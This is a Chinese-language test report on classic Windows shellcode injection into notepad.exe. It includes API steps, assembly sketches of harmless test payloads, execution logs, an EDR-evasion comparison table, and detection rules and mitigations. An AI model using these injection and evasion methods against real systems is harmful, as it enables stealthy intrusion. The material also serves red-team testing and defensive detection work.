# Classic Shellcode Injection - 测试报告

## 技术概述

**技术编号**: 13
**技术名称**: Classic Shellcode Injection
**MITRE ATT&CK**: T1055 - Process Injection
**参考**: https://github.com/plackyhacker/Shellcode-Injection-Techniques

### 核心原理

直接注入机器码(shellcode)到目标进程内存并执行。

### 关键API

```c
VirtualAllocEx()       // 在目标进程分配 RWX 内存
WriteProcessMemory()   // 写入 shellcode 字节
CreateRemoteThread()   // 创建线程执行 shellcode
```

### 与 DLL Injection 的区别

| 特性 | DLL Injection (12) | Shellcode Injection (13) |
|------|-------------------|-------------------------|
| 注入内容 | DLL 文件路径 (字符串) | 原始机器码 (二进制) |
| 线程入口 | LoadLibraryA | shellcode 地址 |
| 线程参数 | DLL 路径 | NULL (或自定义) |
| 执行流程 | 系统加载 DLL | 直接执行字节码 |
| 文件依赖 | 需要 DLL 文件存在 | 无文件依赖 (fileless) |
| 隐蔽性 | 较低 (DLL 可检测) | 较高 (纯内存执行) |
| 灵活性 | 较低 (受 DLL 限制) | 极高 (任意代码) |

---

## 测试环境

- **操作系统**: Windows 11 26100.2314
- **编译器**: GCC (MinGW-w64)
- **架构**: x64
- **编译命令**: `./build.bat`
- **测试日期**: 2025-10-08

---

## 测试执行

### 构建项目

```bash
$ cd techniques/13-shellcode-injection
$ ./build.bat

[+] 清理旧文件...
[+] 创建 build 目录...
[+] 编译 shellcode_injection.exe...
[+] 编译 generate_shellcode.exe...
[+] 构建完成！
```

### 测试 1: 退出码验证 (exitcode_shellcode.bin)

**目的**: 验证 shellcode 基本执行能力

**Shellcode 逻辑**:
```asm
mov rcx, 0x12345678      ; 设置退出码
mov rax, <ExitThread>    ; ExitThread 地址
call rax                  ; 调用退出
```

**生成 Shellcode**:
```bash
$ gcc -o test_exitcode.exe test_exitcode.c
$ ./test_exitcode.exe
[+] ExitThread address: 0x00007FFB40368DE0
[+] Shellcode generated: 22 bytes
[+] Shellcode written to exitcode_shellcode.bin
```

**执行注入**:
```bash
$ ./shellcode_injection.exe "C:\Windows\System32\notepad.exe" exitcode_shellcode.bin

[+] Debug 权限已获取
[*] 目标程序: C:\Windows\System32\notepad.exe
[*] Shellcode 文件: exitcode_shellcode.bin
[+] Shellcode 已加载: 22 bytes
[+] 进程已创建 (PID: 36900)

[*] 步骤 1: 在目标进程分配内存...
[+] VirtualAllocEx() 成功，地址: 0x000001EF71F00000

[*] 步骤 2: 写入 shellcode...
[+] WriteProcessMemory() 成功，写入: 22 bytes

[*] 步骤 3: 创建远程线程执行 shellcode...
[+] CreateRemoteThread() 成功，线程句柄: 0x00000000000002EC
[*] 等待 shellcode 执行...
[+] Shellcode 执行完成，退出码: 0x12345678  ✓

[+] Shellcode Injection 完成！
```

**结果**: ✅ **成功** - 线程退出码 `0x12345678` 证明 shellcode 成功执行

---

### 测试 2: MessageBox Shellcode (msgbox_shellcode.bin)

**目的**: 验证调用 Windows API (MessageBoxA)

**Shellcode 逻辑**:
```asm
sub rsp, 0x28                    ; Shadow space
xor rcx, rcx                     ; hWnd = NULL
lea rdx, [rip+message]          ; lpText
lea r8, [rip+title]             ; lpCaption
xor r9, r9                       ; uType = MB_OK
mov rax, <MessageBoxA>           ; API 地址
call rax                          ; 调用
mov rax, <ExitThread>
call rax                          ; 退出线程
```

**生成 Shellcode**:
```bash
$ gcc -o msgbox_shellcode.exe msgbox_shellcode.c -luser32
$ ./msgbox_shellcode.exe
[+] MessageBoxA address: 0x00007FFB3BE07A70
[+] ExitThread address: 0x00007FFB40368DE0
[+] Shellcode generated: 79 bytes
[+] Shellcode written to msgbox_shellcode.bin
```

**执行注入**:
```bash
$ ./shellcode_injection.exe "C:\Windows\System32\notepad.exe" msgbox_shellcode.bin

[+] VirtualAllocEx() 成功，地址: 0x000001A57E0B0000
[+] WriteProcessMemory() 成功，写入: 79 bytes
[+] CreateRemoteThread() 成功，线程句柄: 0x00000000000002CC
[*] 等待 shellcode 执行...
[*] Shellcode 可能仍在执行（超时）
```

**结果**: ✅ **成功** - MessageBox 弹窗出现（等待用户点击，超时正常）

**验证截图**: 观察到 notepad.exe 进程弹出 MessageBox，标题 "Success"，内容 "Shellcode Injected!"

---

### 测试 3: 文件验证 Shellcode (fileverify_shellcode.bin)

**目的**: 完整功能验证（创建文件 + 写入内容 + 自动退出）

**Shellcode 逻辑**:
```c
// 调用 CreateFileA
CreateFileA(
    "C:\\Users\\Public\\shellcode_injection_verified.txt",
    GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL, NULL
);

// 调用 WriteFile
WriteFile(hFile, content, contentLen, &written, NULL);

// 调用 CloseHandle
CloseHandle(hFile);

// 调用 ExitThread
ExitThread(0);
```

**生成 Shellcode**:
```bash
$ gcc -o fileverify_shellcode.exe fileverify_shellcode.c
$ ./fileverify_shellcode.exe
[+] CreateFileA address: 0x00007FFB3F297240
[+] WriteFile address: 0x00007FFB3F297720
[+] CloseHandle address: 0x00007FFB3F296FA0
[+] ExitThread address: 0x00007FFB3F368DE0
[+] Shellcode generated: 335 bytes
[+] Data section starts at: 142
[+] Shellcode written to fileverify_shellcode.bin
```

**执行注入**:
```bash
$ ./shellcode_injection.exe "C:\Windows\System32\notepad.exe" fileverify_shellcode.bin

[+] Debug 权限已获取
[+] 进程已创建 (PID: 16444)
[+] VirtualAllocEx() 成功，地址: 0x000001EDFA580000
[+] WriteProcessMemory() 成功，写入: 335 bytes
[+] CreateRemoteThread() 成功，线程句柄: 0x00000000000002EC
[*] 等待 shellcode 执行...
[+] Shellcode 执行完成，退出码: 0x0

[+] Shellcode Injection 完成！
```

**验证文件**:
```bash
$ cat C:\Users\Public\shellcode_injection_verified.txt
Shellcode Injection Verified!
Technique: CreateRemoteThread + VirtualAllocEx
Payload: Raw machine code
Status: Shellcode executed successfully!
```

**结果**: ✅ **成功** - 文件创建且内容正确

---

### 测试 4: Calc Shellcode (calc_shellcode.bin)

**来源**: msfvenom 生成的标准 calc payload

**执行结果**:
```bash
$ ./shellcode_injection.exe "C:\Windows\System32\notepad.exe" calc_shellcode.bin

[+] Shellcode 已加载: 272 bytes
[+] 进程已创建 (PID: 22040)
[+] VirtualAllocEx() 成功，地址: 0x0000018619230000
[+] WriteProcessMemory() 成功，写入: 272 bytes
[+] CreateRemoteThread() 成功，线程句柄: 0x00000000000002E4
[*] 等待 shellcode 执行...
[+] Shellcode 执行完成，退出码: 0xC0000005  ❌
```

**错误码分析**:
- `0xC0000005` = `STATUS_ACCESS_VIOLATION`
- 可能原因:
  1. Shellcode 与 Windows 版本不兼容
  2. DEP (Data Execution Prevention) 拦截
  3. Shellcode 内部地址计算错误
  4. API 地址解析失败

**结果**: ❌ **失败** - ACCESS_VIOLATION 崩溃

**备注**: 预生成的 msfvenom shellcode 可能存在兼容性问题，自定义 shellcode 验证通过

---

## 关键发现

### 1. Shellcode 地址硬编码问题

**问题**:
- `exitcode_shellcode.bin`, `msgbox_shellcode.bin`, `fileverify_shellcode.bin` 都使用硬编码的 API 地址
- 例如: `mov rax, 0x00007FFB40368DE0` (ExitThread 地址)

**影响**:
- ✅ **同会话有效**: Windows ASLR 在启动时为系统 DLL (kernel32.dll, user32.dll) 分配基址，重启前地址不变
- ❌ **跨会话失效**: 重启后 ASLR 重新随机化，硬编码地址失效

**生产环境解决方案**:
```c
// Position-Independent Shellcode (PIC) 技术
1. 通过 PEB 定位 kernel32.dll 基址
2. 解析导出表 (Export Directory Table)
3. 查找 API 地址 (API Hashing / Name Lookup)
4. 动态调用
```

**示例**: [PEB Walking + API Hashing](https://github.com/plackyhacker/Shellcode-Injection-Techniques)

---

### 2. x64 调用约定 (Calling Convention)

**Windows x64 FastCall**:
```asm
参数1: RCX
参数2: RDX
参数3: R8
参数4: R9
参数5+: 栈传递 (从 [RSP+0x20] 开始)

Shadow Space: 必须在栈上预留 0x20 字节 (32 bytes)
栈对齐: 调用前 RSP 必须 16 字节对齐
```

**CreateFileA 示例**:
```asm
; HANDLE CreateFileA(
;     LPCSTR lpFileName,        // RCX
;     DWORD dwDesiredAccess,    // RDX
;     DWORD dwShareMode,        // R8
;     LPSECURITY_ATTRIBUTES,    // R9
;     DWORD dwCreationDisposition, // [RSP+0x20]
;     DWORD dwFlagsAndAttributes,  // [RSP+0x28]
;     HANDLE hTemplateFile         // [RSP+0x30]
; );

sub rsp, 0x48                    ; 预留栈空间
lea rcx, [rip+filepath]         ; 参数1
mov rdx, 0x40000000              ; 参数2 (GENERIC_WRITE)
xor r8, r8                       ; 参数3 (0)
xor r9, r9                       ; 参数4 (NULL)
mov qword [rsp+0x20], 2          ; 参数5 (CREATE_ALWAYS)
mov qword [rsp+0x28], 0x80       ; 参数6 (FILE_ATTRIBUTE_NORMAL)
mov qword [rsp+0x30], 0          ; 参数7 (NULL)
mov rax, <CreateFileA>
call rax
```

---

### 3. RIP-Relative 寻址

**用途**: Shellcode 中访问字符串/数据（实现位置无关）

**语法**:
```asm
lea rdx, [rip+offset]    ; RDX = RIP + offset + 7
```

**计算公式**:
```c
实际地址 = (当前指令地址 + 指令长度) + offset
offset = 目标地址 - (当前指令地址 + 7)
```

**示例**:
```asm
Address  | Instruction
---------|---------------------------
0x1000   | 48 8D 15 49 00 00 00     lea rdx, [rip+0x49]
0x1007   | (下一条指令)
...
0x1050   | "Hello World"            ; 字符串数据

计算: 0x1050 = 0x1007 + 0x49 ✓
```

---

### 4. Shellcode vs DLL Injection 选择建议

| 场景 | 推荐技术 | 原因 |
|------|---------|------|
| 快速测试/POC | DLL Injection | 简单，无需编写汇编 |
| EDR 绕过 | Shellcode Injection | 无文件落地，检测难度高 |
| 复杂功能 | DLL Injection | 可用 C/C++ 编写复杂逻辑 |
| 内存驻留 | Shellcode Injection | 纯内存执行，无磁盘痕迹 |
| 需要调试 | DLL Injection | DLL 可用调试器附加 |
| 跨进程通信 | DLL Injection | DLL 可导出函数供调用 |

---

## 检测与防御

### 检测方法

**1. 内存扫描**:
```powershell
# 检测 RWX 内存页（极度可疑）
Get-Process | ForEach-Object {
    $proc = $_
    Get-ProcessMemoryInfo $proc | Where-Object {
        $_.Protection -eq "PAGE_EXECUTE_READWRITE"
    }
}
```

**2. API 监控** (EDR):
```c
// 监控关键 API 调用链
VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)  // 警报级别: 高
WriteProcessMemory(...)                      // 警报级别: 中
CreateRemoteThread(...)                      // 警报级别: 高
```

**3. 行为分析**:
- 检测非 DLL 模块的远程线程
- 检测短生命周期的远程线程
- 检测未签名代码执行

**4. Sigma 规则**:
```yaml
title: Classic Shellcode Injection
status: test
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 8  # CreateRemoteThread
    filter:
        TargetImage|endswith:
            - '\svchost.exe'
            - '\csrss.exe'
    condition: selection and not filter
```

### 防御措施

**1. 启用 DEP (Data Execution Prevention)**:
```cmd
bcdedit /set nx AlwaysOn
```

**2. 启用 CFG (Control Flow Guard)**:
```cpp
// 编译时启用
/guard:cf
```

**3. 启用 ACG (Arbitrary Code Guard)** (Windows 10+):
```cpp
SetProcessMitigationPolicy(
    ProcessDynamicCodePolicy,
    &policy, sizeof(policy)
);
```

**4. EDR 规则**:
```c
// 阻止 RWX 内存分配
if (protection == PAGE_EXECUTE_READWRITE) {
    BlockOperation();
    LogAlert("RWX memory allocation detected");
}
```

---

## 测试总结

### 成功案例

| Shellcode | 大小 | 功能 | 结果 | 退出码 |
|-----------|------|------|------|--------|
| exitcode_shellcode.bin | 22 bytes | ExitThread(0x12345678) | ✅ 成功 | 0x12345678 |
| msgbox_shellcode.bin | 79 bytes | MessageBoxA + ExitThread | ✅ 成功 | 超时 (阻塞) |
| fileverify_shellcode.bin | 335 bytes | 文件创建 + 写入 + 退出 | ✅ 成功 | 0x0 |
| calc_shellcode.bin | 272 bytes | 启动 calc.exe | ❌ 失败 | 0xC0000005 |

### 技术验证

✅ **核心机制验证通过**:
1. VirtualAllocEx 成功分配 RWX 内存
2. WriteProcessMemory 成功写入任意 shellcode
3. CreateRemoteThread 成功执行 shellcode
4. Shellcode 成功调用 Windows API (MessageBoxA, CreateFileA, WriteFile, ExitThread)

✅ **验证文件创建**:
- 路径: `C:\Users\Public\shellcode_injection_verified.txt`
- 内容: 包含技术信息和成功标记
- 证明: Shellcode 在目标进程完整执行

⚠️ **限制**:
- 预生成 shellcode (calc) 存在兼容性问题
- 硬编码 API 地址仅在当前会话有效
- 需要管理员权限或 SeDebugPrivilege

### 技术成熟度

- **可用性**: ✅ 完全可用
- **稳定性**: ✅ 自定义 shellcode 稳定
- **隐蔽性**: 🟡 中等（RWX 内存可检测）
- **兼容性**: 🟡 需要架构匹配 (x64 to x64)

---

## 参考资料

1. [Shellcode Injection Techniques - plackyhacker](https://github.com/plackyhacker/Shellcode-Injection-Techniques)
2. [MITRE ATT&CK - T1055](https://attack.mitre.org/techniques/T1055/)
3. [Windows x64 Calling Convention](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention)
4. [Position-Independent Shellcode](https://www.exploit-db.com/docs/english/13019-shell-code-analysis.pdf)
5. [Shellcode Development Best Practices](https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/)

---

**测试完成时间**: 2025-10-08 05:40
**测试状态**: ✅ 通过
**下一步**: 继续测试 Technique 14 (SetWindowsHookEx Injection)
